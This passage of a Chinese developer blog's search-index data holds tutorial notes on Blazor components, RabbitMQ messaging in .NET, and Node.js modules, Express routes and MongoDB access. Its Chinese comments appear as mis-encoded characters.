&#123; private int currentCount = 0; [Parameter] public int IncrementAmount &#123; get; set; &#125; = 1; private void IncrementCount() &#123; // currentCount++; currentCount += IncrementAmount; &#125;&#125; 123&lt;Counter IncrementAmount=&quot;2&quot; /&gt; ç‚¹å‡»å³å¢åŠ 2 data 1234567&lt;input @bind=&quot;text&quot; /&gt;&lt;button @onclick=&quot;() =&gt; text = string.Empty&quot;&gt;Clear&lt;/button&gt;&lt;p&gt;@text&lt;/p&gt;@code &#123; string text = &quot;&quot;;&#125; ğŸŒ»ToDoListnavComponents&#x2F;Layout&#x2F;NavMenu.razor 12345&lt;div class=&quot;nav-item px-3&quot;&gt; &lt;NavLink class=&quot;nav-link&quot; href=&quot;todo&quot;&gt; &lt;span class=&quot;bi bi-list-nested-nav-menu&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Todo &lt;/NavLink&gt;&lt;/div&gt; TodoItem123456public class TodoItem&#123; public string? Title &#123; get; set; &#125; public bool IsDone &#123; get; set; &#125; = false;&#125; AddItem1234567891011121314151617181920212223242526&lt;ul&gt; @foreach (var todo in todos) &#123; &lt;li&gt;@todo.Title&lt;/li&gt; &#125;&lt;/ul&gt;&lt;br /&gt;&lt;input @bind=&quot;newTodo&quot; /&gt;&lt;button @onclick=&quot;AddTodo&quot;&gt;Add todo&lt;/button&gt;@code &#123; private List&lt;TodoItem&gt; todos = new(); string newTodo = &quot;&quot;; void AddTodo() &#123; if (!string.IsNullOrWhiteSpace(newTodo)) &#123; todos.Add(new TodoItem &#123; Title = newTodo &#125;); newTodo = string.Empty; &#125; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET RabbitMQ NOTE","slug":"NET-RabbitMQ","date":"2024-05-18T15:05:20.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/18/NET-RabbitMQ/","permalink":"https://banjinmei.github.io/2024/05/18/NET-RabbitMQ/","excerpt":"","text":"setup rabbitmqdocker run â€“name&#x3D;rabbit -p 15672:15672 -p 5672:5672 -e RABBITMQ_DEFAULT_USER&#x3D;admin -e RABBITMQ_DEFAULT_PASS&#x3D;xxx -d rabbitmq:management ip:15672 nuget RabbitMQ.Client Send 12345678910111213141516171819//1.1.å®ä¾‹åŒ–è¿æ¥å·¥å‚var factory = new ConnectionFactory() &#123; HostName = &quot;localhost&quot; &#125;;//2. å»ºç«‹è¿æ¥using (var connection = factory.CreateConnection())&#123; //3. åˆ›å»ºä¿¡é“ using (var channel = connection.CreateModel()) &#123; //4. ç”³æ˜é˜Ÿåˆ— channel.QueueDeclare(queue: &quot;hello&quot;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. æ„å»ºbyteæ¶ˆæ¯æ•°æ®åŒ… string message = args.Length &gt; 0 ? args[0] : &quot;Hello RabbitMQ!&quot;; var body = Encoding.UTF8.GetBytes(message); //6. å‘é€æ•°æ®åŒ… channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: null, body: body); Console.WriteLine(&quot; [x] Sent &#123;0&#125;&quot;, message); &#125;&#125; Received 12345678910111213141516171819202122232425262728//1.å®ä¾‹åŒ–è¿æ¥å·¥å‚var factory = new ConnectionFactory() &#123; HostName = &quot;localhost&quot; &#125;;//2. å»ºç«‹è¿æ¥using (var connection = factory.CreateConnection())&#123; //3. åˆ›å»ºä¿¡é“ using (var channel = connection.CreateModel()) &#123; //4. ç”³æ˜é˜Ÿåˆ— channel.QueueDeclare(queue: &quot;hello&quot;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. æ„é€ æ¶ˆè´¹è€…å®ä¾‹ var consumer = new EventingBasicConsumer(channel); //6. ç»‘å®šæ¶ˆæ¯æ¥æ”¶åçš„äº‹ä»¶å§”æ‰˜ consumer.Received += (model, ea) =&gt; &#123; var message = Encoding.UTF8.GetString(ea.Body.ToArray()); Console.WriteLine(&quot; [x] Received &#123;0&#125;&quot;, message); Thread.Sleep(6000);//æ¨¡æ‹Ÿè€—æ—¶ Console.WriteLine(&quot; [x] Done&quot;); &#125;; //7. å¯åŠ¨æ¶ˆè´¹è€… channel.BasicConsume(queue: &quot;hello&quot;, autoAck: true, consumer: consumer); Console.WriteLine(&quot; Press [enter] to exit.&quot;); Console.ReadLine(); &#125;&#125; ErrRabbitMQ.Client.Exceptions.BrokerUnreachableException:â€œNone of the specified endpoints were reachableâ€IP host ErrAuthenticationFailureException: ACCESS_REFUSED - Login was refused using authentication mechanism 12new ConnectionFactory() &#123; HostName = &quot;localhost&quot; ,UserName=&quot;admin&quot;,Password=&quot;xxx&quot;&#125; æ¶ˆæ¯æŒä¹…åŒ– 1234567891011121314//... //4. ç”³æ˜é˜Ÿåˆ—(æŒ‡å®šdurable:true,å‘ŠçŸ¥rabbitmqå¯¹æ¶ˆæ¯è¿›è¡ŒæŒä¹…åŒ–) channel.QueueDeclare(queue: &quot;hellooo&quot;, durable: true, exclusive: false, autoDelete: false, arguments: null); //å°†æ¶ˆæ¯æ ‡è®°ä¸ºæŒä¹…æ€§ - å°†IBasicProperties.SetPersistentè®¾ç½®ä¸ºtrue var properties = channel.CreateBasicProperties(); properties.Persistent = true; //5. æ„å»ºbyteæ¶ˆæ¯æ•°æ®åŒ… string message = args.Length &gt; 0 ? args[0] : &quot;Hello RabbitMQ!&quot;; var body = Encoding.UTF8.GetBytes(message); //6. å‘é€æ•°æ®åŒ…(æŒ‡å®šbasicProperties) channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: properties, body: body); //6. å‘é€æ•°æ®åŒ… channel.BasicPublish(exchange: &quot;&quot;, routingKey: &quot;hello&quot;, basicProperties: null, body: body); Console.WriteLine(&quot; [x] Sent &#123;0&#125;&quot;, message); durable: true","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".netS","slug":"netS","permalink":"https://banjinmei.github.io/tags/netS/"}],"author":"mu"},{"title":"Nodejs2","slug":"Nodejs-Base2","date":"2024-05-17T13:00:03.000Z","updated":"2025-01-21T02:13:47.650Z","comments":true,"path":"2024/05/17/Nodejs-Base2/","permalink":"https://banjinmei.github.io/2024/05/17/Nodejs-Base2/","excerpt":"","text":"ğŸ“˜ utilutil1const util = require(&#x27;util&#x27;); 123456789util.isArray([])util.isRegExp(/some regexp/)util.isDate(new Date()) // true util.isDate(Date()) // false (without &#x27;new&#x27; returns a String) os12345678910111213141516var os = require(&quot;os&quot;);// CPU çš„å­—èŠ‚åºconsole.log(&#x27;endianness : &#x27; + os.endianness());// æ“ä½œç³»ç»Ÿåconsole.log(&#x27;type : &#x27; + os.type());// æ“ä½œç³»ç»Ÿåconsole.log(&#x27;platform : &#x27; + os.platform());// ç³»ç»Ÿå†…å­˜æ€»é‡console.log(&#x27;total memory : &#x27; + os.totalmem() + &quot; bytes.&quot;);// æ“ä½œç³»ç»Ÿç©ºé—²å†…å­˜é‡console.log(&#x27;free memory : &#x27; + os.freemem() + &quot; bytes.&quot;); path123456789101112// æ ¼å¼åŒ–è·¯å¾„console.log(&#x27;normalization : &#x27; + path.normalize(&#x27;/test/test1//2slashes/1slash/tab/..&#x27;));// è¿æ¥è·¯å¾„console.log(&#x27;joint path : &#x27; + path.join(&#x27;/test&#x27;, &#x27;test1&#x27;, &#x27;2slashes/1slash&#x27;, &#x27;tab&#x27;, &#x27;..&#x27;));// è½¬æ¢ä¸ºç»å¯¹è·¯å¾„console.log(&#x27;resolve : &#x27; + path.resolve(&#x27;main.js&#x27;));// è·¯å¾„ä¸­æ–‡ä»¶çš„åç¼€åconsole.log(&#x27;ext name : &#x27; + path.extname(&#x27;main.js&#x27;)); net12345678910111213//clientvar net = require(&#x27;net&#x27;);var client = net.connect(&#123;port: 6001&#125;, function() &#123; console.log(&#x27;è¿æ¥åˆ°æœåŠ¡å™¨ï¼&#x27;); &#125;);client.on(&#x27;data&#x27;, function(data) &#123; console.log(data.toString()); client.end();&#125;);client.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;æ–­å¼€ä¸æœåŠ¡å™¨çš„è¿æ¥&#x27;);&#125;); 12345678910111213//servervar net = require(&#x27;net&#x27;);var server = net.createServer(function(connection) &#123; console.log(&#x27;client connected&#x27;); connection.on(&#x27;end&#x27;, function() &#123; console.log(&#x27;å®¢æˆ·ç«¯å…³é—­è¿æ¥&#x27;); &#125;); connection.write(&#x27;Hello World!\\r\\n&#x27;); connection.pipe(connection);&#125;);server.listen(8080, function() &#123; console.log(&#x27;server is listening&#x27;);&#125;); dns1234567891011var dns = require(&#x27;dns&#x27;);dns.lookup(&#x27;www.qq.com&#x27;, function onLookup(err, address, family) &#123; console.log(&#x27;ip åœ°å€:&#x27;, address); dns.reverse(address, function (err, hostnames) &#123; console.log(&#x27;åå‘è§£æ &#x27; + address + &#x27;: &#x27; + JSON.stringify(hostnames));&#125;); &#125;); ğŸ“•file123456789101112131415161718192021222324//readvar fs = require(&#x27;fs&#x27;);fs.stat(&#x27;E:/vue/nodejs/hello.js&#x27;, function (err, stats) &#123; console.log(stats.isFile()); //true&#125;)var fs = require(&quot;fs&quot;);// å¼‚æ­¥è¯»å–fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;å¼‚æ­¥è¯»å–: &quot; + data.toString());&#125;);// åŒæ­¥è¯»å–var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(&quot;åŒæ­¥è¯»å–: &quot; + data.toString());console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•ã€‚&quot;); 1234567891011121314151617//writevar fs = require(&quot;fs&quot;);fs.writeFile(&#x27;x.txt&#x27;, &#x27;fs.writeFile å†™å…¥æ–‡ä»¶çš„å†…å®¹&#x27;, function(err) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;å†™å…¥æˆåŠŸï¼&quot;); fs.readFile(&#x27;x.txt&#x27;, function (err, data) &#123; if (err) &#123; return console.error(err); &#125; console.log(&quot;å¼‚æ­¥è¯»å–æ–‡ä»¶æ•°æ®: &quot; + data.toString()); &#125;);&#125;); ğŸ“—Get&#x2F;Post12345678var http = require(&#x27;http&#x27;);var url = require(&#x27;url&#x27;);var util = require(&#x27;util&#x27;); http.createServer(function(req, res)&#123; res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); http://localhost:3000/?name=mqm&amp;url=wwwUrl { protocol: null, slashes: null, auth: null, host: null, port: null, hostname: null, hash: null, search: â€˜?name&#x3D;mqm&amp;url&#x3D;wwwâ€™, query: [Object: null prototype] { name: â€˜mqmâ€™, url: â€˜wwwâ€™ }, pathname: â€˜&#x2F;â€˜, path: â€˜&#x2F;?name&#x3D;mqm&amp;url&#x3D;wwwâ€™, href: â€˜&#x2F;?name&#x3D;mqm&amp;url&#x3D;wwwâ€™} 123456789101112131415161718192021222324252627282930313233343536//post var http = require(&#x27;http&#x27;);var querystring = require(&#x27;querystring&#x27;); var postHTML = &#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;POST&lt;/title&gt;&lt;/head&gt;&#x27; + &#x27;&lt;body&gt;&#x27; + &#x27;&lt;form method=&quot;post&quot;&gt;&#x27; + &#x27;NAME: &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27; + &#x27;URLï¼š &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27; + &#x27;&lt;input type=&quot;submit&quot;&gt;&#x27; + &#x27;&lt;/form&gt;&#x27; + &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; http.createServer(function (req, res) &#123; var body = &quot;&quot;; req.on(&#x27;data&#x27;, function (chunk) &#123; body += chunk; &#125;); req.on(&#x27;end&#x27;, function () &#123; // è§£æå‚æ•° body = querystring.parse(body); // è®¾ç½®å“åº”å¤´éƒ¨ä¿¡æ¯åŠç¼–ç  res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf8&#x27;&#125;); if(body.name &amp;&amp; body.url) &#123; // è¾“å‡ºæäº¤çš„æ•°æ® res.write(&quot;NAMEï¼š&quot; + body.name); res.write(&quot;&lt;br&gt;&quot;); res.write(&quot;URLï¼š&quot; + body.url); &#125; else &#123; // è¾“å‡ºè¡¨å• res.write(postHTML); &#125; res.end(); &#125;);&#125;).listen(3000); ğŸ“™Webserver 123456789101112131415161718192021222324252627282930313233var http = require(&#x27;http&#x27;);var fs = require(&#x27;fs&#x27;);var url = require(&#x27;url&#x27;); // åˆ›å»ºæœåŠ¡å™¨http.createServer( function (request, response) &#123; // è§£æè¯·æ±‚ï¼ŒåŒ…æ‹¬æ–‡ä»¶å var pathname = url.parse(request.url).pathname; // è¾“å‡ºè¯·æ±‚çš„æ–‡ä»¶å console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); // ä»æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–è¯·æ±‚çš„æ–‡ä»¶å†…å®¹ fs.readFile(pathname.substr(1), function (err, data) &#123; if (err) &#123; console.log(err); // HTTP çŠ¶æ€ç : 404 : NOT FOUND // Content Type: text/html response.writeHead(404, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); &#125;else&#123; // HTTP çŠ¶æ€ç : 200 : OK // Content Type: text/html response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); // å“åº”æ–‡ä»¶å†…å®¹ response.write(data.toString()); &#125; // å‘é€å“åº”æ•°æ® response.end(); &#125;); &#125;).listen(188); client 123456789101112131415161718192021222324252627var http = require(&#x27;http&#x27;); // ç”¨äºè¯·æ±‚çš„é€‰é¡¹var options = &#123; host: &#x27;localhost&#x27;, port: &#x27;3276&#x27;, path: &#x27;/api/fileApi/GetByfid?fid=1&#x27; &#125;; // å¤„ç†å“åº”çš„å›è°ƒå‡½æ•°var callback = function(response)&#123; // ä¸æ–­æ›´æ–°æ•°æ® var body = &#x27;&#x27;; response.on(&#x27;data&#x27;, function(data) &#123; body += data; &#125;); response.on(&#x27;end&#x27;, function() &#123; // æ•°æ®æ¥æ”¶å®Œæˆ console.log(body); &#125;);&#125;// å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚var req = http.request(options, callback);req.end(); ğŸ““expressrouter 12345678910111213141516171819202122232425262728293031323334353637383940414243var express = require(&#x27;express&#x27;);var app = express(); // ä¸»é¡µè¾“å‡º &quot;Hello World&quot;app.get(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;ä¸»é¡µ GET è¯·æ±‚&quot;); res.send(&#x27;Hello GET&#x27;);&#125;) // POST è¯·æ±‚app.post(&#x27;/&#x27;, function (req, res) &#123; console.log(&quot;ä¸»é¡µ POST è¯·æ±‚&quot;); res.send(&#x27;Hello POST&#x27;);&#125;) // /del_user é¡µé¢å“åº”app.get(&#x27;/del_user&#x27;, function (req, res) &#123; console.log(&quot;/del_user å“åº” DELETE è¯·æ±‚&quot;); res.send(&#x27;åˆ é™¤é¡µé¢&#x27;);&#125;) // /list_user é¡µé¢ GET è¯·æ±‚app.get(&#x27;/list_user&#x27;, function (req, res) &#123; console.log(&quot;/list_user GET è¯·æ±‚&quot;); res.send(&#x27;ç”¨æˆ·åˆ—è¡¨é¡µé¢&#x27;);&#125;) // å¯¹é¡µé¢ abcd, abxcd, ab123cd, ç­‰å“åº” GET è¯·æ±‚app.get(&#x27;/ab*cd&#x27;, function(req, res) &#123; console.log(&quot;/ab*cd GET è¯·æ±‚&quot;); res.send(&#x27;æ­£åˆ™åŒ¹é…&#x27;);&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port) &#125;) Request å¯¹è±¡ - request å¯¹è±¡è¡¨ç¤º HTTP è¯·æ±‚ï¼ŒåŒ…å«äº†è¯·æ±‚æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå‚æ•°ï¼Œå†…å®¹ï¼ŒHTTP å¤´éƒ¨ç­‰å±æ€§ã€‚å¸¸è§å±æ€§æœ‰ï¼š req.appï¼šå½“callbackä¸ºå¤–éƒ¨æ–‡ä»¶æ—¶ï¼Œç”¨req.appè®¿é—®expressçš„å®ä¾‹req.baseUrlï¼šè·å–è·¯ç”±å½“å‰å®‰è£…çš„URLè·¯å¾„req.body &#x2F; req.cookiesï¼šè·å¾—ã€Œè¯·æ±‚ä¸»ä½“ã€&#x2F; Cookiesreq.fresh &#x2F; req.staleï¼šåˆ¤æ–­è¯·æ±‚æ˜¯å¦è¿˜ã€Œæ–°é²œã€req.hostname &#x2F; req.ipï¼šè·å–ä¸»æœºåå’ŒIPåœ°å€req.originalUrlï¼šè·å–åŸå§‹è¯·æ±‚URLreq.paramsï¼šè·å–è·¯ç”±çš„parametersreq.pathï¼šè·å–è¯·æ±‚è·¯å¾„req.protocolï¼šè·å–åè®®ç±»å‹req.queryï¼šè·å–URLçš„æŸ¥è¯¢å‚æ•°ä¸²req.routeï¼šè·å–å½“å‰åŒ¹é…çš„è·¯ç”±req.subdomainsï¼šè·å–å­åŸŸåreq.accepts()ï¼šæ£€æŸ¥å¯æ¥å—çš„è¯·æ±‚çš„æ–‡æ¡£ç±»å‹req.acceptsCharsets &#x2F; req.acceptsEncodings &#x2F; req.acceptsLanguagesï¼šè¿”å›æŒ‡å®šå­—ç¬¦é›†çš„ç¬¬ä¸€ä¸ªå¯æ¥å—å­—ç¬¦ç¼–ç req.get()ï¼šè·å–æŒ‡å®šçš„HTTPè¯·æ±‚å¤´req.is()ï¼šåˆ¤æ–­è¯·æ±‚å¤´Content-Typeçš„MIMEç±»å‹ Response å¯¹è±¡ - response å¯¹è±¡è¡¨ç¤º HTTP å“åº”ï¼Œå³åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶å‘å®¢æˆ·ç«¯å‘é€çš„ HTTP å“åº”æ•°æ®ã€‚å¸¸è§å±æ€§æœ‰ï¼š res.appï¼šåŒreq.appä¸€æ ·res.append()ï¼šè¿½åŠ æŒ‡å®šHTTPå¤´res.set()åœ¨res.append()åå°†é‡ç½®ä¹‹å‰è®¾ç½®çš„å¤´res.cookie(nameï¼Œvalue [ï¼Œoption])ï¼šè®¾ç½®Cookieopition: domain &#x2F; expires &#x2F; httpOnly &#x2F; maxAge &#x2F; path &#x2F; secure &#x2F; signedres.clearCookie()ï¼šæ¸…é™¤Cookieres.download()ï¼šä¼ é€æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶res.get()ï¼šè¿”å›æŒ‡å®šçš„HTTPå¤´res.json()ï¼šä¼ é€JSONå“åº”res.jsonp()ï¼šä¼ é€JSONPå“åº”res.location()ï¼šåªè®¾ç½®å“åº”çš„Location HTTPå¤´ï¼Œä¸è®¾ç½®çŠ¶æ€ç æˆ–è€…close responseres.redirect()ï¼šè®¾ç½®å“åº”çš„Location HTTPå¤´ï¼Œå¹¶ä¸”è®¾ç½®çŠ¶æ€ç 302res.render(view,[locals],callback)ï¼šæ¸²æŸ“ä¸€ä¸ªviewï¼ŒåŒæ—¶å‘callbackä¼ é€’æ¸²æŸ“åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœåœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­æœ‰é”™è¯¯å‘ç”Ÿnext(err)å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚callbackå°†ä¼šè¢«ä¼ å…¥ä¸€ä¸ªå¯èƒ½å‘ç”Ÿçš„é”™è¯¯ä»¥åŠæ¸²æŸ“åçš„é¡µé¢ï¼Œè¿™æ ·å°±ä¸ä¼šè‡ªåŠ¨è¾“å‡ºäº†ã€‚res.send()ï¼šä¼ é€HTTPå“åº”res.sendFile(path [ï¼Œoptions] [ï¼Œfn])ï¼šä¼ é€æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ -ä¼šè‡ªåŠ¨æ ¹æ®æ–‡ä»¶extensionè®¾å®šContent-Typeres.set()ï¼šè®¾ç½®HTTPå¤´ï¼Œä¼ å…¥objectå¯ä»¥ä¸€æ¬¡è®¾ç½®å¤šä¸ªå¤´res.status()ï¼šè®¾ç½®HTTPçŠ¶æ€ç res.type()ï¼šè®¾ç½®Content-Typeçš„MIMEç±»å‹ staticapp.use(â€˜&#x2F;publicâ€™, express.static(â€˜publicâ€™)); Get 12345678910111213141516171819202122232425262728var express = require(&#x27;express&#x27;);var app = express(); app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;)); app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;) app.get(&#x27;/process_get&#x27;, function (req, res) &#123; // è¾“å‡º JSON æ ¼å¼ var response = &#123; &quot;first_name&quot;:req.query.first_name, &quot;last_name&quot;:req.query.last_name &#125;; console.log(response); res.end(JSON.stringify(response));&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port) &#125;) Post 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var app = express();var bodyParser = require(&#x27;body-parser&#x27;); // åˆ›å»º application/x-www-form-urlencoded ç¼–ç è§£ævar urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;) app.use(&#x27;/public&#x27;, express.static(&#x27;public&#x27;)); app.get(&#x27;/index.html&#x27;, function (req, res) &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.html&quot; );&#125;) app.post(&#x27;/process_post&#x27;, urlencodedParser, function (req, res) &#123; // è¾“å‡º JSON æ ¼å¼ var response = &#123; &quot;first_name&quot;:req.body.first_name, &quot;last_name&quot;:req.body.last_name &#125;; console.log(response); res.end(JSON.stringify(response));&#125;) var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port) &#125;) ğŸ“’RESTful API data 123456789101112131415161718192021&#123; &quot;b1&quot; : &#123; &quot;name&quot; : &quot;h&quot;, &quot;con&quot; : &quot;hihihi&quot;, &quot;id&quot;: 1 &#125;, &quot;b2&quot; : &#123; &quot;name&quot; : &quot;b&quot;, &quot;con&quot; : &quot;bobobo&quot;, &quot;id&quot;: 2 &#125;, &quot;b3&quot; : &#123; &quot;name&quot; : &quot;c&quot;, &quot;con&quot; : &quot;cccccc&quot;, &quot;id&quot;: 3 &#125; &#125; list 1234567891011121314151617181920var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/list&#x27;, function (req, res) &#123; fs.readFile( __dirname + &quot;/&quot; + &quot;books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; console.log( data ); res.end( data ); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;è®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)&#125;) add 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);//æ·»åŠ var bk= &#123; &quot;b4&quot; : &#123; &quot;name&quot; : &quot;b4&quot;, &quot;com&quot; : &quot;this is b4&quot;, &quot;id&quot;: 4 &#125;&#125;app.get(&#x27;/add&#x27;, function (req, res) &#123; // è¯»å–å·²å­˜åœ¨çš„æ•°æ® fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); data[&quot;b4&quot;] = bk[&quot;b4&quot;]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)&#125;) id 123456789101112131415161718192021var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);app.get(&#x27;/:id&#x27;, function (req, res) &#123; // é¦–å…ˆæˆ‘ä»¬è¯»å–å·²å­˜åœ¨çš„ç”¨æˆ· fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); var user = data[&quot;b&quot; + req.params.id] console.log( user ); res.end( JSON.stringify(user)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s&quot;, host, port)&#125;) delete 1234567891011121314151617181920212223242526var express = require(&#x27;express&#x27;);var app = express();var fs = require(&quot;fs&quot;);var id = 2;app.get(&#x27;/delete&#x27;, function (req, res) &#123; // First read existing users. fs.readFile( __dirname + &quot;/&quot; + &quot;Books.json&quot;, &#x27;utf8&#x27;, function (err, data) &#123; data = JSON.parse( data ); delete data[&quot;b&quot; + id]; console.log( data ); res.end( JSON.stringify(data)); &#125;);&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(&quot; http://%s:%s&quot;, host, port)&#125;) ğŸ“šï¸child_processNode æä¾›äº† child_process æ¨¡å—æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œæ–¹æ³•æœ‰ï¼š exec - child_process.exec ä½¿ç”¨å­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œç¼“å­˜å­è¿›ç¨‹çš„è¾“å‡ºï¼Œå¹¶å°†å­è¿›ç¨‹çš„è¾“å‡ºä»¥å›è°ƒå‡½æ•°å‚æ•°çš„å½¢å¼è¿”å›ã€‚ spawn - child_process.spawn ä½¿ç”¨æŒ‡å®šçš„å‘½ä»¤è¡Œå‚æ•°åˆ›å»ºæ–°è¿›ç¨‹ã€‚ fork - child_process.fork æ˜¯ spawn()çš„ç‰¹æ®Šå½¢å¼ï¼Œç”¨äºåœ¨å­è¿›ç¨‹ä¸­è¿è¡Œçš„æ¨¡å—ï¼Œå¦‚ fork(â€˜.&#x2F;son.jsâ€™) ç›¸å½“äº spawn(â€˜nodeâ€™, [â€˜.&#x2F;son.jsâ€™]) ã€‚ä¸spawnæ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œforkä¼šåœ¨çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´ï¼Œå»ºç«‹ä¸€ä¸ªé€šä¿¡ç®¡é“ï¼Œç”¨äºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ 12345678910111213141516171819const fs = require(&#x27;fs&#x27;);const child_process = require(&#x27;child_process&#x27;); for(var i=0; i&lt;10; i++) &#123; var workerProcess = child_process.exec(&#x27;node hello.js &#x27;+i, function (error, stdout, stderr) &#123; if (error) &#123; console.log(error.stack); console.log(&#x27;Error code : &#x27;+error.code); console.log(&#x27;Signal received: &#x27;+error.signal); &#125; console.log(&#x27;stdout: &#x27; + stdout); console.log(&#x27;stderr: &#x27; + stderr); &#125;); workerProcess.on(&#x27;exit&#x27;, function (code) &#123; console.log(&#x27;å­è¿›ç¨‹å·²é€€å‡ºï¼Œé€€å‡ºç  &#x27;+code); &#125;);&#125; spawn() æ–¹æ³•è¿”å›æµ (stdout &amp; stderr)ï¼Œåœ¨è¿›ç¨‹è¿”å›å¤§é‡æ•°æ®æ—¶ä½¿ç”¨ã€‚è¿›ç¨‹ä¸€æ—¦å¼€å§‹æ‰§è¡Œæ—¶ spawn() å°±å¼€å§‹æ¥æ”¶å“åº”ã€‚child_process.fork æ˜¯ spawn() æ–¹æ³•çš„ç‰¹æ®Šå½¢å¼ã€‚ ğŸ“”mogodbmongodb 1docker run --name mongodb -v /data/mongodb0:/data/db -p 27017:27017 -d mongo npm 1npm install mongodb è¿›å…¥ MongoDB å®¹å™¨çš„ bash shell å‘½ä»¤å¦‚ä¸‹ï¼š 12docker exec -it mongodb bash #mongosh --host 127.0.0.1 --port 27017 è®°å¾—åœ¨ä¸å†éœ€è¦æ—¶åœæ­¢å’Œåˆ é™¤å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 12docker stop mongodb docker rm mongodb 123&gt; show dbs&gt; show tables&gt; db.site.find() create 123456789101112131415161718192021222324252627282930const &#123; MongoClient &#125; = require(&#x27;mongodb&#x27;);// MongoDBè¿æ¥URIconst uri = &#x27;mongodb://localhost:27017&#x27;;// åˆ›å»ºMongoDBå®¢æˆ·ç«¯const client = new MongoClient(uri);async function main() &#123; try &#123; // è¿æ¥åˆ°MongoDB await client.connect(); console.log(&#x27;Connected to MongoDB&#x27;); // åˆ›å»ºæ•°æ®åº“ const databaseName = &#x27;myDatabase&#x27;; const db = client.db(databaseName); console.log(`Database &#x27;$&#123;databaseName&#125;&#x27; created`); &#125; catch (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; finally &#123; // å…³é—­MongoDBè¿æ¥ await client.close(); console.log(&#x27;Disconnected from MongoDB&#x27;); &#125;&#125;main().catch(console.error); insert 1234567891011121314151617181920212223242526272829303132333435363738394041const &#123; MongoClient &#125; = require(&#x27;mongodb&#x27;);const uri = &#x27;mongodb://localhost:27017&#x27;;const client = new MongoClient(uri);async function main() &#123; try &#123; await client.connect(); 